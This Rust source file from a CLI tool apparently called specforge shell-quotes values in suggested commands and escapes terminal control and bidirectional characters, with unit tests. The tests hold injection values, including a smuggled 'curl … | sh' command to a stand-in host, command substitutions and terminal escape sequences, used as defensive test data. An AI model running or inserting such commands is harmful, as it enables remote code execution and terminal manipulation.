//! The commands a remedy names (ADR 0135, ADR 0230): a `specforge` command whose values come from
//! somewhere the host does not decide (a lock entry, a specforge.json entry, a declaration) is written
//! so a POSIX shell reads each value back as one word, unchanged. The JSON another program sends
//! is held printable once, where it is read ([`hold_printable`], ADR 0244).

use std::borrow::Cow;

/// `template` (a `specforge …` command, its `{}` standing for `values` in order) with each value
/// written as one shell word: bare when it is non-empty and only `A-Z a-z 0-9 @ % + = : , . / _ -`,
/// else single-quoted with each `'` as `'\''`. A control character is written as its escape
/// ([`printable`]), so no value starts a line or a terminal sequence; such a value is none the host
/// records (the lock refuses it, a package name has none). A `{}` with no value left stays `{}`.
/// A value is never scanned again, so one holding `{}` is not substituted.
pub fn command(template: &str, values: &[&str]) -> String {
    let mut values = values.iter();
    let mut parts = template.split("{}");
    let mut out = parts.next().unwrap_or_default().to_string();
    for part in parts {
        match values.next() {
            Some(value) => out.push_str(&word(value)),
            None => out.push_str("{}"),
        }
        out.push_str(part);
    }
    out
}

/// `text` with each control character (`char::is_control`: C0, DEL, C1) and each bidirectional
/// control (U+200E, U+200F, U+202A-U+202E, U+2066-U+2069) written as its escape (`\n`, `\u{1b}`);
/// the text itself when it holds none. The form of any text another program supplies (a lock, a
/// registry's reply or error) in a message or a listing: it cannot move a terminal's cursor, set its
/// title, write a line of its own or reorder what is shown (ADR 0230, 0231).
pub fn printable(text: &str) -> Cow<'_, str> {
    escaped(text, false)
}

/// [`printable`], a newline and a tab kept when `keep_lines` (a file's text).
fn escaped(text: &str, keep_lines: bool) -> Cow<'_, str> {
    let escape = |c: char| is_unprintable(c) && !(keep_lines && matches!(c, '\n' | '\t'));
    if !text.contains(escape) {
        return Cow::Borrowed(text);
    }
    Cow::Owned(
        text.chars()
            .map(|c| {
                if escape(c) {
                    c.escape_default().to_string()
                } else {
                    c.to_string()
                }
            })
            .collect(),
    )
}

/// The keys of a declaration whose text is a file's (a starter template): held printable but for
/// their newlines and tabs (ADR 0244).
pub const DECLARED_LINES: &[&str] = &["starter_template"];

/// Every string of `value`, and every object key, held [`printable`]; a string under a key named in
/// `lines` keeps its newlines and tabs, every other control and bidirectional character escaped.
/// Text another program sends as JSON is held here once, where it is read (an extension's answer,
/// a registry's manifest), so every surface that later prints it carries the same harmless text.
/// Idempotent, as [`printable`] is.
pub fn hold_printable(value: &mut serde_json::Value, lines: &[&str]) {
    hold(value, false, lines);
}

fn hold(value: &mut serde_json::Value, keep_lines: bool, lines: &[&str]) {
    use serde_json::Value;
    match value {
        Value::String(text) => {
            if let Cow::Owned(held) = escaped(text, keep_lines) {
                *text = held;
            }
        }
        Value::Array(items) => items.iter_mut().for_each(|item| hold(item, false, lines)),
        Value::Object(map) => {
            let renamed: Vec<String> = map
                .keys()
                .filter(|k| k.contains(is_unprintable))
                .cloned()
                .collect();
            for key in renamed {
                if let Some(item) = map.remove(&key) {
                    map.insert(printable(&key).into_owned(), item);
                }
            }
            for (key, item) in map.iter_mut() {
                hold(item, lines.contains(&key.as_str()), lines);
            }
        }
        _ => {}
    }
}

/// A character a terminal acts on, or one that reorders how the text around it is shown
/// ("Trojan Source").
fn is_unprintable(c: char) -> bool {
    c.is_control()
        || matches!(c, '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}')
}

fn word(value: &str) -> String {
    let bare = !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "@%+=:,./_-".contains(c));
    if bare {
        return value.to_string();
    }
    format!("'{}'", printable(value).replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Values that hold no control character, as a shell must read them back.
    const VALUES: [&str; 12] = [
        "ext/a.wasm",
        "@sdk/greet@0.1.0",
        "",
        "My Ext/a.wasm",
        "it's",
        "a; curl -s e.x|sh #",
        "$(id)",
        "`id`",
        "~/x",
        "a*b",
        "é.wasm",
        "{} again",
    ];

    #[test]
    fn a_value_is_one_shell_word_whatever_it_holds() {
        let one = |value| command("specforge add {}", &[value]);
        assert_eq!(one("ext/a.wasm"), "specforge add ext/a.wasm");
        assert_eq!(one("@sdk/greet@0.1.0"), "specforge add @sdk/greet@0.1.0");
        assert_eq!(one(""), "specforge add ''");
        assert_eq!(one("My Ext/a.wasm"), "specforge add 'My Ext/a.wasm'");
        assert_eq!(one("it's"), "specforge add 'it'\\''s'");
        assert_eq!(
            one("a; curl -s e.x|sh #"),
            "specforge add 'a; curl -s e.x|sh #'"
        );
        for quoted in ["$(id)", "`id`", "~/x", "a*b", "é.wasm"] {
            assert_eq!(one(quoted), format!("specforge add '{quoted}'"));
        }
        assert_eq!(
            command("specforge login --registry {} --token <TOKEN>", &["a b"]),
            "specforge login --registry 'a b' --token <TOKEN>"
        );
        assert_eq!(command("specforge add {}", &["{}"]), "specforge add '{}'");
        assert_eq!(command("add {} {}", &["x"]), "add x {}");
    }

    #[test]
    fn a_control_character_is_written_as_its_escape() {
        let shown = printable("a\nb\u{1b}[8m");
        assert_eq!(shown, "a\\nb\\u{1b}[8m");
        assert!(!shown.contains(char::is_control));
        assert!(matches!(printable("plain"), Cow::Borrowed("plain")));
        let word = command("specforge add {}", &["x\ny"]);
        assert_eq!(word, "specforge add 'x\\ny'");
    }

    #[test]
    fn a_bidirectional_control_is_written_as_its_escape() {
        let shown = printable("a\u{202e}b\u{2066}c");
        assert_eq!(shown, "a\\u{202e}b\\u{2066}c");
        assert!(!shown.contains(is_unprintable));
    }

    #[test]
    fn printable_is_idempotent() {
        let once = printable("nice \u{1b}[2J\u{1b}]0;pwned\u{7}\n\u{202e}");
        assert_eq!(printable(&once), once);
    }

    #[test]
    fn every_string_and_key_is_held_printable() {
        let mut value = serde_json::json!({
            "a\u{1b}": ["x\u{7}", {"n": 1, "b": true, "k\u{202e}": "y\u{9b}"}],
            "plain": "ok",
        });
        hold_printable(&mut value, &[]);
        assert_eq!(
            value,
            serde_json::json!({
                "a\\u{1b}": ["x\\u{7}", {"n": 1, "b": true, "k\\u{202e}": "y\\u{9b}"}],
                "plain": "ok",
            })
        );
    }

    #[test]
    fn a_lines_key_keeps_its_newlines_and_tabs() {
        let mut value = serde_json::json!({"starter_template": "a\n\tb\r\u{1b}", "other": "a\n"});
        hold_printable(&mut value, DECLARED_LINES);
        assert_eq!(
            value,
            serde_json::json!({"starter_template": "a\n\tb\\r\\u{1b}", "other": "a\\n"})
        );
    }

    #[test]
    fn holding_is_idempotent() {
        let mut once =
            serde_json::json!({"k\u{1b}": ["\u{202e}\n", {"starter_template": "\n\u{7}"}]});
        hold_printable(&mut once, DECLARED_LINES);
        let mut twice = once.clone();
        hold_printable(&mut twice, DECLARED_LINES);
        assert_eq!(once, twice);
    }

    #[cfg(unix)]
    #[test]
    fn a_quoted_value_reads_back_through_sh() {
        for value in VALUES {
            let word = word(value);
            let output = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("printf '%s' {word}"))
                .stdin(std::process::Stdio::null())
                .output()
                .unwrap();
            assert_eq!(String::from_utf8_lossy(&output.stdout), value, "{word}");
        }
    }
}
